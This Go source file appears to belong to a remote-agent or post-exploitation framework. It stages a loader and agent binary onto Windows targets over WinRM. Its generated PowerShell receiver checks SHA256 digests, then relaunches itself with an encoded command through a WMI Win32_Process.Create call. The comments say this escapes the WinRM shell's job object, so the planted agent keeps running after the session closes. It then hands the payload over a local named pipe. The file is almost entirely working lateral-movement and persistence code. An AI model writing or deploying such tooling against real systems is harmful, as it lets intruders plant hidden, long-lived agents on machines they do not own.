package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
)

// Independent WinRM loader deployments escape the shell job the same way the
// WMI chain does: the shell's receiver re-stages the deployment through a
// LOCAL Win32_Process.Create, whose process is owned by the WMI provider and
// therefore outside the WinRM shell's job object. Closing the shell kills the
// shell receiver only; the mapped agent lives in the independent host until
// the target reboots or an explicit kill.

// winrmIndependentReceiverScriptLimit bounds the length-prefixed secondary
// receiver script streamed through stdin: the WinRS command line cannot carry
// both receivers' scripts, so the secondary bootstrap travels as data.
const winrmIndependentReceiverScriptLimit = 64 * 1024

// prepareWinRMIndependentTransfer builds the independent deployment stream:
// a 4-byte little-endian length prefix and the secondary receiver script,
// then the loader and artifact halves of the standard framing.
func prepareWinRMIndependentTransfer(agent []byte, secondary []byte) (*winrmTransfer, error) {
	transfer, err := prepareWinRMTransferFromBytes(agent)
	if err != nil {
		return nil, err
	}
	if len(secondary) == 0 || len(secondary) > winrmIndependentReceiverScriptLimit {
		return nil, fmt.Errorf("secondary receiver script must be between 1 and %d bytes", winrmIndependentReceiverScriptLimit)
	}
	prefix := make([]byte, 4)
	binary.LittleEndian.PutUint32(prefix, uint32(len(secondary)))
	transfer.source = io.MultiReader(bytes.NewReader(prefix), bytes.NewReader(secondary), transfer.source)
	transfer.size += int64(len(prefix) + len(secondary))
	transfer.scriptSize = int64(len(secondary))
	return transfer, nil
}

// winrmIndependentScript builds the shell receiver for an independent
// deployment. It verifies both streamed halves, launches the secondary
// receiver through a local WMI process create, relays the payload over a
// local named pipe, and only prints the shell readiness marker after the
// secondary receiver proves its own loader readiness. The source then tears
// the WinRM session down: the shell receiver dies with the shell's job (it
// exits on its own), and the mapped agent keeps running in the independent
// host, living exactly like a WMI loader deployment.
func winrmIndependentScript(sessionID string, transfer *winrmTransfer) string {
	return fmt.Sprintf(`$ErrorActionPreference='Stop'
$s=[Console]::OpenStandardInput()
$ln=New-Object byte[] 4
$q=0
while($q -lt 4){$n=$s.Read($ln,$q,4-$q);if($n -le 0){throw 'receiver transfer is truncated'};$q+=$n}
$c=[BitConverter]::ToUInt32($ln,0)
if($c -lt 1 -or $c -gt %d){throw 'receiver transfer is invalid'}
$w=New-Object byte[] $c
$q=0
while($q -lt $c){$n=$s.Read($w,$q,$c-$q);if($n -le 0){throw 'receiver transfer is truncated'};$q+=$n}
$code=[Text.Encoding]::UTF8.GetString($w)
$r=New-Object byte[] %d
$q=0
while($q -lt %d){$n=$s.Read($r,$q,%d-$q);if($n -le 0){throw 'receiver transfer is truncated'};$q+=$n}
$h=[Security.Cryptography.SHA256]::Create()
try{$a=[BitConverter]::ToString($h.ComputeHash($r)).Replace('-','').ToLowerInvariant()}finally{$h.Dispose()}
if($a -ne %s){throw 'loader SHA256 mismatch'}
$b=New-Object byte[] %d
$q=0
while($q -lt %d){$n=$s.Read($b,$q,%d-$q);if($n -le 0){throw 'agent input is truncated'};$q+=$n}
$h=[Security.Cryptography.SHA256]::Create()
try{$x=[BitConverter]::ToString($h.ComputeHash($b)).Replace('-','').ToLowerInvariant()}finally{$h.Dispose()}
if($x -ne %s){throw 'agent SHA256 mismatch'}
$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($code))
$cmd='"'+$PSHOME+'\powershell.exe" -NoLogo -NoProfile -NonInteractive -EncodedCommand '+$enc
$m=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=$cmd}
$rc=-1
if($m){$rc=[int]$m.ReturnValue}
if($rc -ne 0){throw ('local receiver creation failed: '+$rc)}
$p=New-Object System.IO.Pipes.NamedPipeClientStream('.',%s)
$p.Connect(%d)
$p.Write($r,0,$r.Length)
$p.Write($b,0,$b.Length)
$t=''
$y=New-Object byte[] 1
while($p.Read($y,0,1) -gt 0){
if($y[0] -eq 10){break}
$t+=[char]$y[0]}
$p.Close()
if($t -ne %s){
[Console]::Out.Write($t)
[Console]::Out.Flush()
exit 1}
[Console]::Out.Write(%s)
[Console]::Out.Flush()
exit 0`,
		winrmIndependentReceiverScriptLimit,
		transfer.loaderSize,
		transfer.loaderSize,
		transfer.loaderSize,
		winrmPowerShellLiteral(transfer.loaderDigest),
		transfer.binarySize,
		transfer.binarySize,
		transfer.binarySize,
		winrmPowerShellLiteral(transfer.binaryDigest),
		winrmPowerShellLiteral(wmiLoaderPipeName(sessionID)),
		int(wmiLoaderConnectBudget.Milliseconds()),
		winrmPowerShellLiteral(winrmLoaderReadyMarker),
		winrmPowerShellLiteral(winrmLoaderReadyMarker))
}
